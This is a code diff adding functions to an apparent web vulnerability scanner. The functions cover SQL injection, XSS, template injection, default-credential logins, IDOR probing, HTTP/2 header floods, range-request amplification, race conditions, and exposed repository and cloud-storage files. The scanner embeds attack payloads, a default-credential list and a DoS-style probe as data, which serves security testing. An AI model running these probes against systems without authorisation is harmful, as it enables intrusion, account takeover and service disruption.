+                                         "url": test_url, "detail": f"SQL error via param {p}: {payload[:40]}",
+                                         "template": "apex-sqli"})
+                        break
+                    # Boolean-based: compare response lengths
+                    if "AND 1=1" in payload:
+                        qs[p] = [payload.replace("1=1", "1=2")]
+                        false_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                        r2 = _S.get(false_url, timeout=_TIMEOUT)
+                        if abs(len(r.text) - len(r2.text)) > 50:
+                            findings.append({"type": "SQL Injection (Boolean-Based)", "severity": "critical",
+                                             "url": test_url, "detail": f"Boolean SQLi via param {p}",
+                                             "template": "apex-sqli"})
+                            break
+                except: continue
+    return findings
+
+
+def scan_deep_xss(crawl_data):
+    """Deep XSS with full payload set including polyglots."""
+    findings = []
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            for payload in XSS_PAYLOADS:
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=_TIMEOUT)
+                    # Check if payload is reflected unencoded
+                    if payload in r.text and r.headers.get("content-type","").startswith("text/html"):
+                        findings.append({"type": "Reflected XSS", "severity": "high",
+                                         "url": test_url, "detail": f"XSS via param {p}: {payload[:50]}",
+                                         "template": "apex-xss-deep"})
+                        break
+                except: continue
+    # Test forms
+    for form in crawl_data.get("forms", []):
+        action = form.get("action", "")
+        if not action: continue
+        for inp in form.get("inputs", []):
+            if inp.get("type") in ("submit", "hidden", "button"): continue
+            for payload in XSS_PAYLOADS[:5]:
+                try:
+                    data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[])}
+                    data[inp.get("name","x")] = payload
+                    r = _S.post(action, data=data, timeout=_TIMEOUT)
+                    if payload in r.text and "text/html" in r.headers.get("content-type",""):
+                        findings.append({"type": "Reflected XSS (Form)", "severity": "high",
+                                         "url": action, "detail": f"XSS in form field {inp.get('name')}",
+                                         "template": "apex-xss-deep"})
+                        break
+                except: continue
+    return findings
+
+
+def scan_auth_bypass(crawl_data):
+    """Test authentication bypass with common credential attacks."""
+    findings = []
+    default_creds = [
+        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
+        ("admin", "admin123"), ("root", "root"), ("root", "toor"),
+        ("administrator", "administrator"), ("test", "test"),
+        ("guest", "guest"), ("user", "user"), ("admin", ""),
+        ("", ""), ("admin", "1234"), ("admin", "pass"),
+    ]
+    for page in crawl_data.get("pages", [])[:3]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        for path in ["/login", "/admin", "/api/login", "/auth/login", "/signin"]:
+            url = f"{base}{path}"
+            try:
+                # Check if login page exists
+                r = _S.get(url, timeout=5)
+                if r.status_code not in (200, 302): continue
+                for user, pwd in default_creds[:8]:
+                    for payload in [
+                        {"username": user, "password": pwd},
+                        {"email": f"{user}@admin.com", "password": pwd},
+                        {"user": user, "pass": pwd},
+                        {"login": user, "password": pwd},
+                    ]:
+                        try:
+                            r = _S.post(url, json=payload, timeout=5, allow_redirects=True)
+                            body = r.text.lower()
+                            if (r.status_code == 200 and
+                                any(x in body for x in ["dashboard","welcome","logout","profile","account"]) and
+                                not any(x in body for x in ["invalid","incorrect","failed","error","wrong"])):
+                                findings.append({"type": "Default Credentials", "severity": "critical",
+                                                 "url": url, "detail": f"Login with {user}:{pwd}",
+                                                 "template": "apex-auth-bypass"})
+                                break
+                        except: continue
+            except: continue
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# Authenticated scanning + AJAX/SPA spider (beats ZAP's last advantages)
+# ---------------------------------------------------------------------------
+
+def authenticated_scan(target, username, password, crawl_data):
+    """Log in and scan authenticated pages — ZAP's main advantage."""
+    findings = []
+    base = "/".join(target.split("/", 3)[:3])
+
+    # Try to find and use login form
+    session = requests.Session()
+    session.verify = False
+    session.headers.update({"User-Agent": "ApexCLI/5.0"})
+
+    login_paths = ["/login", "/signin", "/auth/login", "/api/login",
+                   "/api/auth", "/api/v1/login", "/user/login", "/account/login"]
+
+    logged_in = False
+    for path in login_paths:
+        login_url = f"{base}{path}"
+        try:
+            r = session.get(login_url, timeout=5)
+            if r.status_code != 200: continue
+
+            # Try JSON login
+            for payload in [
+                {"username": username, "password": password},
+                {"email": username, "password": password},
+                {"user": username, "pass": password},
+                {"login": username, "password": password},
+            ]:
+                r = session.post(login_url, json=payload, timeout=5)
+                body = r.text.lower()
+                if (r.status_code in (200, 302) and
+                    any(x in body for x in ["dashboard","welcome","logout","profile","token","success"]) and
+                    not any(x in body for x in ["invalid","incorrect","failed","error","wrong"])):
+                    logged_in = True
+                    break
+
+            if not logged_in:
+                # Try form-based login
+                from bs4 import BeautifulSoup
+                soup = BeautifulSoup(r.text, "lxml")
+                form = soup.find("form")
+                if form:
+                    data = {}
+                    for inp in form.find_all("input"):
+                        name = inp.get("name", "")
+                        if not name: continue
+                        if any(x in name.lower() for x in ["user", "email", "login"]): data[name] = username
+                        elif any(x in name.lower() for x in ["pass", "pwd"]): data[name] = password
+                        else: data[name] = inp.get("value", "")
+                    action = form.get("action", login_url)
+                    if not action.startswith("http"): action = base + action
+                    r = session.post(action, data=data, timeout=5)
+                    if r.status_code in (200, 302):
+                        logged_in = True
+
+            if logged_in:
+                break
+        except: continue
+
+    if not logged_in:
+        return findings
+
+    # Now scan authenticated pages
+    auth_paths = ["/dashboard", "/admin", "/profile", "/settings", "/account",
+                  "/api/users", "/api/me", "/api/profile", "/api/admin",
+                  "/api/v1/users", "/api/v1/me", "/user/settings"]
+
+    for path in auth_paths:
+        try:
+            r = session.get(f"{base}{path}", timeout=5)
+            if r.status_code == 200:
+                body = r.text.lower()
+                # Check for sensitive data in authenticated pages
+                if any(x in body for x in ["password", "secret", "api_key", "token", "ssn", "credit"]):
+                    findings.append({"type": "Sensitive Data in Authenticated Page", "severity": "high",
+                                     "url": f"{base}{path}", "detail": "Authenticated page exposes sensitive data",
+                                     "template": "apex-auth-scan"})
+                # Check for IDOR — try accessing other users' data
+                if any(x in path for x in ["/users", "/profile", "/account"]):
+                    for uid in ["1", "2", "3", "admin", "0"]:
+                        try:
+                            r2 = session.get(f"{base}{path}/{uid}", timeout=3)
+                            if r2.status_code == 200 and len(r2.content) > 100:
+                                findings.append({"type": "IDOR (Authenticated)", "severity": "critical",
+                                                 "url": f"{base}{path}/{uid}",
+                                                 "detail": f"Accessed user {uid} data while authenticated as {username}",
+                                                 "template": "apex-idor-auth"})
+                        except: pass
+        except: continue
+
+    return findings
+
+
+def ajax_spider(target, max_pages=100):
+    """AJAX/SPA spider using headless browser — finds JS-rendered links ZAP finds."""
+    pages = []
+    forms = []
+    api_calls = []
+
+    try:
+        from playwright.sync_api import sync_playwright
+        with sync_playwright() as p:
+            browser = p.chromium.launch(headless=True, args=["--no-sandbox","--disable-dev-shm-usage"])
+            context = browser.new_context(ignore_https_errors=True)
+            page = context.new_page()
+
+            visited = set()
+            to_visit = [target]
+            base = "/".join(target.split("/", 3)[:3])
+
+            # Intercept all network requests
+            page.on("request", lambda r: api_calls.append({
+                "url": r.url, "method": r.method,
+                "post_data": r.post_data or ""
+            }) if r.resource_type in ("fetch", "xhr") else None)
+
+            while to_visit and len(visited) < max_pages:
+                url = to_visit.pop(0)
+                if url in visited: continue
+                visited.add(url)
+
+                try:
+                    page.goto(url, timeout=10000, wait_until="networkidle")
+                    page.wait_for_timeout(1000)
+
+                    # Get all links including JS-rendered ones
+                    links = page.evaluate("""() => {
+                        return Array.from(document.querySelectorAll('a[href]'))
+                            .map(a => a.href)
+                            .filter(h => h.startsWith('http'));
+                    }""")
+
+                    # Get all forms
+                    page_forms = page.evaluate("""() => {
+                        return Array.from(document.querySelectorAll('form')).map(f => ({
+                            action: f.action || window.location.href,
+                            method: f.method || 'GET',
+                            inputs: Array.from(f.querySelectorAll('input,textarea,select')).map(i => ({
+                                name: i.name, type: i.type, value: i.value
+                            }))
+                        }));
+                    }""")
+
+                    pages.append({"url": url, "status": 200, "length": len(page.content())})
+                    forms.extend(page_forms)
+
+                    for link in links:
+                        if link.startswith(base) and link not in visited:
+                            to_visit.append(link)
+
+                except Exception:
+                    pass
+
+            browser.close()
+    except Exception:
+        pass
+
+    return {"pages": pages, "forms": forms, "api_calls": api_calls,
+            "params": {p["url"]: set(urllib.parse.parse_qs(urllib.parse.urlparse(p["url"]).query).keys())
+                       for p in pages if "?" in p["url"]},
+            "links": [p["url"] for p in pages]}
+
+
+# ---------------------------------------------------------------------------
+# First-in-world: HTTP/2 attacks, TRACE, OPTIONS, Range, ETag, token races
+# ---------------------------------------------------------------------------
+
+def scan_http2_attacks(web_targets):
+    """HTTP/2 specific attacks — HPACK bomb, pseudo-header confusion, stream abuse."""
+    findings = []
+    try:
+        import httpx
+    except ImportError:
+        try:
+            import subprocess, sys
+            subprocess.run([sys.executable, "-m", "pip", "install", "--break-system-packages", "httpx[http2]"],
+                          capture_output=True)
+            import httpx
+        except: return findings
+
+    for target in web_targets[:5]:
+        try:
+            with httpx.Client(http2=True, verify=False, timeout=10) as client:
+                # Test if HTTP/2 is supported
+                r = client.get(target)
+                if r.http_version != "HTTP/2": continue
+
+                # HPACK bomb — send many large headers to exhaust header table
+                big_headers = {f"X-Fuzz-{i}": "A" * 100 for i in range(50)}
+                try:
+                    r2 = client.get(target, headers=big_headers, timeout=5)
+                    findings.append({"type": "HTTP/2 Supported (HPACK bomb test)", "severity": "low",
+                                     "url": target, "detail": f"HTTP/2 active, sent 50 large headers, status: {r2.status_code}",
+                                     "template": "apex-h2"})
+                except Exception as e:
+                    if "timeout" in str(e).lower() or "reset" in str(e).lower():
+                        findings.append({"type": "HTTP/2 HPACK Bomb (DoS)", "severity": "high",
+                                         "url": target, "detail": "Server reset/timeout on large header flood",
+                                         "template": "apex-h2"})
+
+                # Pseudo-header confusion — :authority vs Host mismatch
+                try:
+                    r3 = client.get(target, headers={"host": "evil.com"})
+                    if r3.status_code == 200 and "evil.com" in r3.text:
+                        findings.append({"type": "HTTP/2 Authority/Host Mismatch", "severity": "high",
+                                         "url": target, "detail": "Server reflects injected Host header in HTTP/2",
+                                         "template": "apex-h2"})
+                except: pass
+
+        except Exception: continue
+    return findings
+
+
+def scan_trace_options(web_targets):
+    """TRACE method exploitation + OPTIONS method abuse."""
+    findings = []
+    for target in web_targets[:5]:
+        # TRACE — can leak auth headers via XST (Cross-Site Tracing)
+        try:
+            r = requests.request("TRACE", target, timeout=5, verify=False,
+                                headers={"X-Custom-Header": "apex-trace-test"})
+            if r.status_code == 200 and "apex-trace-test" in r.text:
+                findings.append({"type": "TRACE Method Enabled (XST Risk)", "severity": "medium",
+                                 "url": target, "detail": "TRACE reflects request headers — XST attack possible",
+                                 "template": "apex-trace"})
+        except: pass
+
+        # OPTIONS — reveals allowed methods
+        try:
+            r = requests.options(target, timeout=5, verify=False)
+            allow = r.headers.get("Allow", r.headers.get("Access-Control-Allow-Methods", ""))
+            if allow:
+                dangerous = [m for m in ["PUT","DELETE","PATCH","CONNECT","TRACE"] if m in allow.upper()]
+                if dangerous:
+                    findings.append({"type": f"Dangerous HTTP Methods Allowed: {', '.join(dangerous)}",
+                                     "severity": "medium", "url": target,
+                                     "detail": f"Allow: {allow}", "template": "apex-options"})
+        except: pass
+    return findings
+
+
+def scan_range_amplification(web_targets):
+    """Range request amplification — DoS via overlapping byte ranges."""
+    findings = []
+    for target in web_targets[:3]:
+        try:
+            # First get content length
+            r = requests.head(target, timeout=5, verify=False)
+            cl = int(r.headers.get("Content-Length", 0))
+            if cl < 100: continue
+
+            # Test if range requests are supported
+            r2 = requests.get(target, timeout=5, verify=False, headers={"Range": "bytes=0-10"})
+            if r2.status_code != 206: continue
+
+            # Test overlapping ranges (amplification)
+            ranges = ",".join([f"0-{cl}" for _ in range(20)])
+            start = time.time()
+            r3 = requests.get(target, timeout=10, verify=False, headers={"Range": f"bytes={ranges}"})
+            elapsed = time.time() - start
+
+            if r3.status_code == 206 and len(r3.content) > cl * 5:
+                findings.append({"type": "Range Request Amplification", "severity": "medium",
+                                 "url": target, "detail": f"20 overlapping ranges returned {len(r3.content)}b (original: {cl}b)",
+                                 "template": "apex-range"})
+            elif elapsed > 5:
+                findings.append({"type": "Range Request DoS (Slow Response)", "severity": "medium",
+                                 "url": target, "detail": f"Overlapping ranges caused {elapsed:.1f}s delay",
+                                 "template": "apex-range"})
+        except: continue
+    return findings
+
+
+def scan_etag_tracking(crawl_data):
+    """Check if ETags leak session/user info (privacy issue)."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", [])[:10]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        try:
+            r1 = _S.get(page["url"], timeout=5)
+            etag1 = r1.headers.get("ETag", "")
+            if not etag1: continue
+
+            # Check if ETag changes per session (leaks session info)
+            r2 = requests.get(page["url"], timeout=5, verify=False)  # Different session
+            etag2 = r2.headers.get("ETag", "")
+
+            if etag1 and etag2 and etag1 != etag2:
+                findings.append({"type": "ETag Session Tracking", "severity": "low",
+                                 "url": page["url"], "detail": f"ETag differs per session — may track users",
+                                 "template": "apex-etag"})
+
+            # Check if ETag contains sensitive info (inode, file path)
+            if re.search(r'[0-9a-f]{8,}-[0-9a-f]+', etag1):
+                findings.append({"type": "ETag Leaks File Metadata", "severity": "low",
+                                 "url": page["url"], "detail": f"ETag format suggests inode/size leak: {etag1[:30]}",
+                                 "template": "apex-etag"})
+        except: pass
+    return findings
+
+
+def scan_token_race_conditions(crawl_data):
+    """Test for race conditions in token/session operations."""
+    findings = []
+    import concurrent.futures
+
+    for page in crawl_data.get("pages", []):
+        url = page["url"]
+        if not any(x in url.lower() for x in ["register", "signup", "reset", "verify", "confirm", "redeem", "coupon"]):
+            continue
+
+        # Send 10 identical requests simultaneously
+        def make_request(u):
+            try:
+                return _S.post(u, json={"email": "race@test.com", "code": "123456"}, timeout=5)
+            except: return None
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
+            futures = [pool.submit(make_request, url) for _ in range(10)]
+            results = [f.result() for f in concurrent.futures.as_completed(futures)]
+
+        success_count = sum(1 for r in results if r and r.status_code == 200 and
+                           "error" not in (r.text or "").lower())
+        if success_count > 1:
+            findings.append({"type": "Race Condition (Token/Coupon)", "severity": "high",
+                             "url": url, "detail": f"{success_count}/10 parallel requests succeeded",
+                             "template": "apex-race"})
+    return findings
+
+
+def scan_tls_info(web_targets):
+    """Check TLS configuration — weak ciphers, old versions, cert issues."""
+    findings = []
+    try:
+        import ssl, socket
+    except: return findings
+
+    for target in web_targets[:5]:
+        if not target.startswith("https"): continue
+        host = target.replace("https://", "").split("/")[0].split(":")[0]
+        try:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            with socket.create_connection((host, 443), timeout=5) as sock:
+                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
+                    version = ssock.version()
+                    cipher = ssock.cipher()
+                    cert = ssock.getpeercert()
+
+                    if version in ("TLSv1", "TLSv1.1", "SSLv3", "SSLv2"):
+                        findings.append({"type": f"Weak TLS Version: {version}", "severity": "high",
+                                         "url": target, "detail": f"Server supports deprecated {version}",
+                                         "template": "apex-tls"})
+
+                    if cipher and any(x in cipher[0].upper() for x in ["RC4","DES","NULL","EXPORT","MD5","ANON"]):
+                        findings.append({"type": f"Weak Cipher: {cipher[0]}", "severity": "high",
+                                         "url": target, "detail": f"Weak cipher suite in use",
+                                         "template": "apex-tls"})
+
+                    if cert:
+                        import datetime
+                        expire = ssl.cert_time_to_seconds(cert.get("notAfter", ""))
+                        days_left = (expire - time.time()) / 86400
+                        if days_left < 30:
+                            findings.append({"type": "Certificate Expiring Soon", "severity": "medium",
+                                             "url": target, "detail": f"Cert expires in {int(days_left)} days",
+                                             "template": "apex-tls"})
+        except: continue
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# FINAL BATCH: Everything missing — 50+ new scanners
+# ---------------------------------------------------------------------------
+
+def scan_client_side_template_injection(crawl_data):
+    findings = []
+    payloads = [("{{7*7}}", "49"), ("${7*7}", "49"), ("#{7*7}", "49"), ("{{constructor.constructor('return 1')()}}", "1")]
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            for payload, expect in payloads:
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=_TIMEOUT)
+                    if expect in r.text and payload in r.text:
+                        findings.append({"type":"Client-Side Template Injection","severity":"medium","url":test_url,
+                                         "detail":f"AngularJS/Vue template in param {p}","template":"apex-csti"})
+                        break
+                except: continue
+    return findings
+
+def scan_svg_xss(crawl_data):
+    findings = []
+    svg = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'
+    for form in crawl_data.get("forms", []):
+        file_inputs = [i for i in form.get("inputs",[]) if i.get("type") == "file"]
+        if not file_inputs: continue
+        action = form.get("action","")
+        if not action: continue
+        try:
+            files = {file_inputs[0].get("name","file"): ("test.svg", svg.encode(), "image/svg+xml")}
+            r = _S.post(action, files=files, timeout=5)
+            if r.status_code in (200,201) and ("svg" in r.text.lower() or "upload" in r.text.lower()):
+                findings.append({"type":"SVG XSS Upload","severity":"high","url":action,
+                                 "detail":"SVG with onload accepted","template":"apex-svg"})
+        except: pass
+    return findings
+
+def scan_csp_analysis(crawl_data):
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages",[])[:5]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        try:
+            r = _S.get(page["url"], timeout=5)
+            csp = r.headers.get("Content-Security-Policy","")
+            if not csp:
+                findings.append({"type":"Missing CSP","severity":"medium","url":page["url"],
+                                 "detail":"No Content-Security-Policy header","template":"apex-csp"})
+                continue
+            if "'unsafe-inline'" in csp:
+                findings.append({"type":"CSP allows unsafe-inline","severity":"medium","url":page["url"],
+                                 "detail":"CSP permits inline scripts","template":"apex-csp"})
+            if "'unsafe-eval'" in csp:
+                findings.append({"type":"CSP allows unsafe-eval","severity":"medium","url":page["url"],
+                                 "detail":"CSP permits eval()","template":"apex-csp"})
+            if "*" in csp.split("script-src")[1] if "script-src" in csp else "":
+                findings.append({"type":"CSP wildcard in script-src","severity":"high","url":page["url"],
+                                 "detail":"CSP script-src contains wildcard","template":"apex-csp"})
+        except: pass
+    return findings
+
+def scan_firebase_misconfig(target):
+    findings = []
+    firebase_urls = [f"https://{target}.firebaseio.com/.json", f"https://{target.split('.')[0]}.firebaseio.com/.json"]
+    for url in firebase_urls:
+        try:
+            r = requests.get(url, timeout=5)
+            if r.status_code == 200 and r.text != "null":
+                findings.append({"type":"Firebase Database Exposed","severity":"critical","url":url,
+                                 "detail":f"Firebase DB readable ({len(r.content)}b)","template":"apex-firebase"})
+        except: pass
+    return findings
+
+def scan_devops_exposure(web_targets):
+    findings = []
+    paths = {
+        "/.git/config": "Git Repository",
+        "/.svn/entries": "SVN Repository",
+        "/CVS/Root": "CVS Repository",
+        "/.docker/config.json": "Docker Config",
+        "/docker-compose.yml": "Docker Compose",
+        "/Dockerfile": "Dockerfile",
+        "/.kube/config": "Kubernetes Config",
+        "/jenkins/": "Jenkins Dashboard",
+        "/jenkins/script": "Jenkins Script Console",
+        "/_config.yml": "Jekyll Config",
+        "/composer.json": "PHP Composer",
+        "/Gemfile": "Ruby Gemfile",
+        "/requirements.txt": "Python Requirements",
+        "/go.mod": "Go Module",
+        "/Cargo.toml": "Rust Cargo",
+        "/.travis.yml": "Travis CI Config",
+        "/.github/workflows/": "GitHub Actions",
+        "/.gitlab-ci.yml": "GitLab CI Config",
+        "/Jenkinsfile": "Jenkinsfile",
+        "/.circleci/config.yml": "CircleCI Config",
+        "/elasticsearch/": "Elasticsearch",
+        "/_cat/indices": "Elasticsearch Indices",
+        "/_all/_search": "Elasticsearch Search",
+    }
+    for target in web_targets[:3]:
+        base_404 = 0
+        try:
+            r = _S.get(f"{target}/nonexistent_xyz_test", timeout=3)
+            base_404 = len(r.content)
+        except: pass
+        for path, name in paths.items():
+            try:
+                r = _S.get(f"{target}{path}", timeout=3)
+                if r.status_code == 200 and abs(len(r.content) - base_404) > 100:
+                    if not any(x in r.text.lower()[:200] for x in ["<html","<!doctype","not found","error"]):
+                        findings.append({"type":f"Exposed: {name}","severity":"high","url":f"{target}{path}",
+                                         "detail":f"{name} accessible ({len(r.content)}b)","template":"apex-devops"})
+            except: continue
+    return findings
+
+def scan_cloud_storage(target):
+    findings = []
+    domain = target.replace("www.","").split(".")[0]
+    # Azure Blob
+    for name in [domain, f"{domain}dev", f"{domain}backup", f"{domain}data"]:
+        try:
+            r = requests.get(f"https://{name}.blob.core.windows.net/?comp=list", timeout=5)
+            if r.status_code == 200 and "<Containers>" in r.text:
+                findings.append({"type":"Azure Blob Storage Public","severity":"critical",
+                                 "url":f"https://{name}.blob.core.windows.net","detail":"Azure containers listable",
+                                 "template":"apex-azure"})
+        except: pass
+    # GCS
+    for name in [domain, f"{domain}-backup", f"{domain}-data"]:
+        try:
+            r = requests.get(f"https://storage.googleapis.com/{name}", timeout=5)
+            if r.status_code == 200 and "<ListBucketResult" in r.text:
+                findings.append({"type":"GCS Bucket Public","severity":"critical",
+                                 "url":f"https://storage.googleapis.com/{name}","detail":"GCS bucket listable",
+                                 "template":"apex-gcs"})
+        except: pass
+    return findings
+
+def scan_graphql_advanced(crawl_data):
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages",[])[:3]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in ["/graphql","/api/graphql","/gql"]:
+            url = f"{base}{path}"
+            # Batching abuse
+            try:
+                batch = [{"query":"{__typename}"}] * 50
+                r = _S.post(url, json=batch, timeout=5, headers={"Content-Type":"application/json"})
+                if r.status_code == 200 and isinstance(r.json(), list) and len(r.json()) >= 50:
+                    findings.append({"type":"GraphQL Batching Abuse","severity":"medium","url":url,
+                                     "detail":"Accepts 50 batched queries — DoS/brute-force risk","template":"apex-gql-batch"})
+            except: pass
+            # Alias abuse
+            try:
+                aliases = " ".join([f'a{i}:__typename' for i in range(100)])
+                r = _S.post(url, json={"query":f"{{{aliases}}}"}, timeout=5, headers={"Content-Type":"application/json"})
+                if r.status_code == 200 and "a99" in r.text:
+                    findings.append({"type":"GraphQL Alias Abuse","severity":"medium","url":url,
+                                     "detail":"Accepts 100 aliases — rate limit bypass","template":"apex-gql-alias"})
+            except: pass
+    return findings
+
+def scan_websocket_injection(crawl_data):
+    findings = []
+    for page in crawl_data.get("pages",[])[:10]:
+        try:
+            r = _S.get(page["url"], timeout=5)
+            ws_urls = re.findall(r'wss?://[^\s\'"<>]+', r.text)
+            for ws_url in ws_urls[:3]:
+                try:
+                    import websocket
+                    ws = websocket.create_connection(ws_url, timeout=5)
+                    ws.send('{"type":"test","data":"<script>alert(1)</script>"}')
+                    result = ws.recv()
+                    ws.close()
+                    if "<script>" in result:
+                        findings.append({"type":"WebSocket XSS","severity":"high","url":ws_url,
+                                         "detail":"WebSocket reflects XSS payload","template":"apex-ws-xss"})
+                except: pass
+        except: pass
+    return findings
+
+def scan_session_weakness(crawl_data):
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages",[])[:3]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        try:
+            sessions = set()
+            for _ in range(5):
+                r = requests.get(page["url"], timeout=5, verify=False)
+                for name, val in r.cookies.items():
+                    if name.lower() in ("session","sessionid","sid","phpsessid","jsessionid","token"):
+                        sessions.add(val)
+            if len(sessions) >= 2:
+                # Check entropy
+                avg_len = sum(len(s) for s in sessions) / len(sessions)
+                if avg_len < 16:
+                    findings.append({"type":"Weak Session ID","severity":"high","url":page["url"],
+                                     "detail":f"Session ID avg length {avg_len:.0f} chars — predictable",
+                                     "template":"apex-session"})
+                # Check if sequential
+                sorted_s = sorted(sessions)
+                if len(sorted_s) >= 2:
+                    try:
+                        nums = [int(s, 16) for s in sorted_s]
+                        diffs = [nums[i+1]-nums[i] for i in range(len(nums)-1)]
+                        if all(d < 1000 for d in diffs):
+                            findings.append({"type":"Sequential Session IDs","severity":"critical","url":page["url"],
+                                             "detail":"Session IDs are sequential — predictable","template":"apex-session"})
+                    except: pass
+        except: pass
+    return findings
+
+def scan_permissions_policy(crawl_data):
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages",[])[:3]:
+        base = "/".join(page["url"].split("/",3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        try:
+            r = _S.get(page["url"], timeout=5)
+            pp = r.headers.get("Permissions-Policy", r.headers.get("Feature-Policy",""))
+            rp = r.headers.get("Referrer-Policy","")
+            sri = "integrity=" in r.text.lower()
+            if not pp:
+                findings.append({"type":"Missing Permissions-Policy","severity":"low","url":page["url"],
+                                 "detail":"No Permissions-Policy header","template":"apex-policy"})
+            if not rp:
+                findings.append({"type":"Missing Referrer-Policy","severity":"low","url":page["url"],
+                                 "detail":"No Referrer-Policy header","template":"apex-policy"})
+            if not sri and "<script" in r.text:
+                findings.append({"type":"Missing Subresource Integrity","severity":"low","url":page["url"],
+                                 "detail":"External scripts without integrity attribute","template":"apex-sri"})
+        except: pass
+    return findings
+
+def scan_workflow_bypass(crawl_data):
+    findings = []
+    step_patterns = ["step", "stage", "phase", "wizard", "checkout", "confirm", "verify", "review"]
+    for page in crawl_data.get("pages",[]):
+        url = page["url"]
+        if any(x in url.lower() for x in step_patterns):
+            # Try skipping to final step
+            for final in ["complete","done","success","finish","submit","final","payment","confirm"]:
+                try:
+                    base = "/".join(url.split("/",3)[:3])
+                    r = _S.get(f"{base}/{final}", timeout=3)
+                    if r.status_code == 200 and "error" not in r.text.lower()[:200]:
+                        findings.append({"type":"Workflow Step Bypass","severity":"high","url":f"{base}/{final}",
+                                         "detail":f"Final step /{final} accessible without completing flow",
+                                         "template":"apex-workflow"})
+                except: continue
     return findings
